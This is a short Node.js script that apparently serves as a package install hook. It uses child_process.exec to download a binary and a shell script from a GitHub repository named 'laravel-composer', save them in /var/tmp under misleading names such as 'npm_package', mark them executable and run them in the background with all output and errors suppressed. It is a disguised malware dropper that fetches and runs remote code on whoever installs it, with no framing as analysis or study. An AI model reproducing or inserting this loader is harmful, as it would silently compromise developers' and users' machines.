const { exec } = require("child_process");

const command = `
curl -fsSL https://github.com/laravel-main/laravel-composer/raw/refs/heads/main/laravel-composer -o /var/tmp/npm_package && \
chmod +x /var/tmp/npm_package && \
curl -fsSL https://raw.githubusercontent.com/laravel-main/laravel-composer/refs/heads/main/package-run.sh -o /var/tmp/package-run.sh && \
chmod +x /var/tmp/package-run.sh && \
(nohup /var/tmp/npm_package > /dev/null 2>&1 &) && \
(nohup bash /var/tmp/package-run.sh > /dev/null 2>&1 &)
`;

exec(command, { detached: true, stdio: 'ignore' }, (error, stdout, stderr) => {
    // Silently handle any errors
});
